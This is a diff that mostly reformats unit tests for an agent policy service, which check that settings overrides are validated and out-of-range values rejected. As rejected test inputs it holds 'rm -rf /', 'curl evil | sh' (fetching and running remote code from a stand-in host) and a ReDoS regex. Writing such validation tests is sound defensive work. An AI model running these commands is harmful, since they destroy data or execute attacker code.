@@ -68,7 +68,13 @@ describe('AgentPolicyService (#1140)', () => {
         settings: { intervalSeconds: 1800, collect: { software: false } },
       });
       const policy = await service.resolveForReport(
-        { kind: 'service', serviceAccount: { id: 'sa', agentPolicy: { collect: { containers: false } } } } as never,
+        {
+          kind: 'service',
+          serviceAccount: {
+            id: 'sa',
+            agentPolicy: { collect: { containers: false } },
+          },
+        } as never,
         { intervalSeconds: 3600 },
       );
       expect(policy.revision).toBe(5);
@@ -86,12 +92,17 @@ describe('AgentPolicyService (#1140)', () => {
         revision: 9,
         settings: { intervalSeconds: 'every-so-often', script: 'rm -rf /' },
       });
-      const policy = await service.resolveForReport(AGENT_SA, { collect: 'yes please' });
+      const policy = await service.resolveForReport(AGENT_SA, {
+        collect: 'yes please',
+      });
       expect(policy).toEqual({ ...AGENT_POLICY_DEFAULT, revision: 9 });
     });
 
     it('a human principal (no service account) simply contributes no middle layer', async () => {
-      prisma.agentPolicySettings.findUnique.mockResolvedValue({ revision: 2, settings: {} });
+      prisma.agentPolicySettings.findUnique.mockResolvedValue({
+        revision: 2,
+        settings: {},
+      });
       const policy = await service.resolveForReport(
         { kind: 'human', user: { id: 'u-1' } } as never,
         undefined,
@@ -102,14 +113,21 @@ describe('AgentPolicyService (#1140)', () => {
 
   describe('the revision counter — ANY write at ANY scope bumps it', () => {
     it('an instance-default write bumps the revision', async () => {
-      prisma.agentPolicySettings.upsert.mockResolvedValue({ revision: 4, settings: {} });
+      prisma.agentPolicySettings.upsert.mockResolvedValue({
+        revision: 4,
+        settings: {},
+      });
       prisma.agentPolicySettings.update.mockResolvedValue({
         revision: 5,
         settings: { intervalSeconds: 600 },
       });
-      const result = await service.setInstanceOverride({ intervalSeconds: 600 });
+      const result = await service.setInstanceOverride({
+        intervalSeconds: 600,
+      });
       expect(result.revision).toBe(5);
-      const arg = prisma.agentPolicySettings.update.mock.calls[0][0] as {
+      const arg = (
+        prisma.agentPolicySettings.update.mock.calls as unknown[][]
+      )[0][0] as {
         data: { revision: { increment: number } };
       };
       expect(arg.data.revision).toEqual({ increment: 1 });
@@ -122,7 +140,9 @@ describe('AgentPolicyService (#1140)', () => {
     });
 
     it('a SERVICE ACCOUNT override write bumps it too', async () => {
-      await service.setServiceAccountOverride('sa-agent', { intervalSeconds: 900 });
+      await service.setServiceAccountOverride('sa-agent', {
+        intervalSeconds: 900,
+      });
       expect(prisma.serviceAccount.update).toHaveBeenCalled();
       expect(prisma.agentPolicySettings.update).toHaveBeenCalled();
     });
@@ -136,20 +156,22 @@ describe('AgentPolicyService (#1140)', () => {
   describe('writes are ENFORCED even though reads are tolerant', () => {
     it('rejects an override carrying a key outside the closed set', async () => {
       await expect(
-        service.setInstanceOverride({ script: 'curl evil | sh' } as never),
+        service.setInstanceOverride({ script: 'curl evil | sh' }),
       ).rejects.toBeInstanceOf(BadRequestException);
       expect(prisma.agentPolicySettings.update).not.toHaveBeenCalled();
     });
 
     it('rejects a regular expression where a glob belongs', async () => {
       await expect(
-        service.setInstanceOverride({ exclude: { nicNames: ['^(a+)+$'] } } as never),
+        service.setInstanceOverride({
+          exclude: { nicNames: ['^(a+)+$'] },
+        }),
       ).rejects.toBeInstanceOf(BadRequestException);
     });
 
     it('rejects a cadence below the fixed tick — the agent physically cannot honour it', async () => {
       await expect(
-        service.setInstanceOverride({ intervalSeconds: 30 } as never),
+        service.setInstanceOverride({ intervalSeconds: 30 }),
       ).rejects.toBeInstanceOf(BadRequestException);
     });
 
@@ -163,9 +185,9 @@ describe('AgentPolicyService (#1140)', () => {
 
     it('404s on an unknown (or revoked) service account', async () => {
       prisma.serviceAccount.findFirst.mockResolvedValue(null);
-      await expect(service.setServiceAccountOverride('nope', {})).rejects.toBeInstanceOf(
-        NotFoundException,
-      );
+      await expect(
+        service.setServiceAccountOverride('nope', {}),
+      ).rejects.toBeInstanceOf(NotFoundException);
     });
   });
 });
